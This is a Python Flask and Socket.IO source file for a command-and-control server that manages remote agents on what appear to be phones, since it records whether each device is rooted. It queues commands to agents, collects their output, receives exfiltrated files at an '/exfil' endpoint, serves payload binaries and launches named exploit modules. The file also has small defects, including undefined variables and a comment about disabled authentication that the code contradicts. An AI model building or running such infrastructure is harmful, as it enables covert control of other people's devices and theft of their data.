import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, abort, send_file, render_template
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import os
import time
from token_utils import verify_signature, register_token, get_device_token, rotate_token

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# In-memory command queue for demo (replace with DB in production)
command_queue = {}
result_store = {}
connected_agents = {}
agent_sockets = {}

# === Auth Middleware (disabled temporarily for dev/testing) ===
@app.before_request
def check_auth():
    if request.path.startswith(("/get_command", "/set_command", "/post_output")):
        agent_id = request.headers.get("X-Agent-ID")
        sig = request.headers.get("X-Signature")
        if not agent_id or not sig or not verify_signature(sig, agent_id):
            abort(403)

# === Web Dashboard ===
@app.route("/")
def dashboard():
    return render_template("index.html")

# === Agent Registration ===
def register_device(device_id, meta):
    connected_agents[device_id] = {
        "manufacturer": meta.get("manufacturer", "unknown"),
        "model": meta.get("model", "unknown"),
        "rooted": meta.get("rooted", "unknown"),
        "last_seen": time.time()
    }

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    device_id = data.get("device_id")
    token = register_token(device_id)
    register_device(device_id, data)
    print(f"[+] Registered Agent: {device_id} {connected_agents[device_id]}")
    return jsonify({"status": "registered", "token": token})

# === Token Management ===
@app.route("/token/<device_id>", methods=["GET"])
def get_token_for_device(device_id):
    token = get_device_token(device_id)
    if token:
        return jsonify({"device_id": device_id, "token": token})
    return jsonify({"error": "Token not found"}), 404

@app.route("/token/rotate/<device_id>", methods=["POST"])
def rotate_token_for_device(device_id):
    new_token = rotate_token(device_id)
    return jsonify({"device_id": device_id, "new_token": new_token})

# === View All Registered Agents ===
@app.route("/agents", methods=["GET"])
def list_agents():
    now = time.time()
    agents = []
    for device_id, meta in connected_agents.items():
        meta_copy = meta.copy()
        meta_copy["device_id"] = device_id
        meta_copy["online"] = (now - meta["last_seen"]) < 60
        agents.append(meta_copy)
    return jsonify(agents)

# === Poll-based C2 commands ===
@app.route("/api/send_command", methods=["POST"])
def send_command_to_agent():
    data = request.json
    device_id = data["device_id"]
    command = data["command"]
    args = data["args"]
    command_queue[device_id] = (command, args)
    return jsonify({"status": "queued"})

@app.route("/get_command/<device_id>", methods=["GET"])
def get_command_for_agent(device_id):
    if device_id in command_queue:
        command, args = command_queue.pop(device_id)
        return jsonify({"command": command, "args": args})
    return jsonify({"command": None})

@app.route("/api/submit_result", methods=["POST"])
def receive_result():
    data = request.json
    device_id = data["device_id"]
    result = data["result"]
    # Save result for later retrieval or print/log
    result_store[device_id] = result
    return jsonify({"status": "received"})

@app.route("/api/get_result/<device_id>")
def get_result(device_id):
    return jsonify({"result": result_store.get(device_id)})

 # === Manual Output & Command Endpoint (for debugging) ===
@app.route("/post_output", methods=["POST"])
def post_output():
    data = request.json
    device_id = data.get("device_id")
    output = data.get("output")
    device_outputs[device_id] = output
    connected_agents[device_id]["last_seen"] = time.time()
    print(f"[<] Output from {device_id}:\n{output}")
    return jsonify({"status": "ok"})

@app.route("/set_command", methods=["POST"])
def set_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    device_commands[device_id] = command
    print(f"[!] Command for {device_id} set to: {command}")
    return jsonify({"status": "command set"})

# === File Exfiltration ===
@app.route("/exfil", methods=["POST"])
def receive_file():
    content = request.data.decode()
    print(f"\n[EXFIL] Received file data:\n{content}\n")
    return jsonify({"status": "received"})

# === Dynamic Exploit Module Execution ===
@app.route("/exploit/<module_name>", methods=["POST"])
def generic_exploit(module_name):
    try:
        data = request.json
        device_id = data.get("device_id")
        package = data.get("package")
        component = data.get("component") 
        module = __import__(f"modules.{module_name}", fromlist=["generate_command"])
        command = module.generate_command(package, component)
        device_id = data.get("device_id")
        command_queue[device_id] = (command , {})
        return jsonify({"status": "queued", "command": command})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# === Payload Serving ===
@app.route("/payloads/<filename>", methods=["GET"])
def get_payload(filename):
    payload_path = os.path.join("payloads", filename)
    if not os.path.exists(payload_path):
        return {"error": "File not found"}, 404
    return send_file(payload_path, mimetype="application/octet-stream")

# === File Upload Support to Server ===
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    os.makedirs("uploads", exist_ok=True)
    file.save(os.path.join("uploads", file.filename))
    return jsonify({"status": "ok"})

# === WebSocket Event Handling ===
@socketio.on('connect')
def on_connect():
    print("[✓] Agent connected via WebSocket")

@socketio.on('disconnect')
def on_disconnect():
    # Optional: cleanup logic or print info
    print(f"[!] A client disconnected")

@socketio.on('register')
def register_agent(data):
    device_id = data.get("device_id")
    register_device(device_id, data)
    agent_sockets[device_id] = request.sid
    emit('agent_list', connected_agents, broadcast=True)
    print(f"[+] WebSocket Agent registered: {device_id}")

@socketio.on('command_result')
def on_command_result(data):
    device_id = data.get("device_id")
    result = data.get("result")
    result_store[device_id] = result
    print(f"[<] WebSocket Result from {device_id}:\n{result}")

@socketio.on('send_command')
def send_command(data):
    device_id = data.get("device_id")
    command = data.get("command")
    args = data.get("args", {})
    if device_id and command:
        command_queue[device_id] = command
        sid = agent_sockets.get(device_id)
        if sid:
            emit('command', {'cmd': command, 'args': args}, to=sid)
        print(f"[>] Sent to {device_id}: {command}")

# === Start Server ===
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000)
